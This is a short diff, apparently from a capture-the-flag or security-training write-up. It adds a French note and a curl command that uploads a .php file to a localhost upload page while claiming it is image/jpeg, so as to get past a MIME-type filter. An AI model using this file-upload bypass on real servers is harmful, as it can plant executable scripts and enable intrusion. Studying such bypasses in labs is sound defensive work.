@@ -1,0 +1,5 @@
+Rajout d'un fichier .php dans le champ upload en faisant 
+croire au client que c'est une image pour contourner un filtre de type MIME
+curl -X POST "http://localhost:8080/?page=upload" \
+-F "uploaded=@test.php;type=image/jpeg" \
+-F "Upload=Upload"
